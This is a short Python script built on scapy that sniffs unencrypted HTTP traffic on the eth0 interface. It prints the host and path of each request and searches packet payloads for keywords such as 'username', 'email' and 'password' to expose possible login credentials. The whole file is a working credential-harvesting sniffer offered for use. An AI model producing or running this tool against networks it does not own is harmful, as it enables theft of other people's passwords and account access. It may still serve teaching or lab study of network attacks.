#!/usr/bin/env python
import scapy.all as scapy
#for http packets
from scapy.layers import http
from colorama import init, Fore, Back, Style


def sniff(interface):
    print(scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet))

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_loginifo(packet):
    if packet.haslayer(scapy.Raw):
        # raw is the layer change it for diff layer
        load = str(packet[scapy.Raw].load)
        #print(load)
        # show all pkt info the password and login info sent in post
        keyword = ["username", "user", "email", "login", "password", "pss", "uname"]
        for k in keyword:
            if k in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[-] New Packet\n")
        print(packet)
        website=get_url(packet)
        print(Style.BRIGHT + Back.WHITE + Fore.BLACK +"[+]HTTP Request >> "+Style.BRIGHT + Back.BLACK + Fore.WHITE)
        print(str(website))
        login_info=get_loginifo(packet)
        if login_info:
            print(Style.BRIGHT + Back.YELLOW + Fore.RED +"\n[+] Possible username/password >> "+Style.BRIGHT + Back.BLACK + Fore.WHITE )
            print(str(login_info) + "\n")


sniff("eth0")
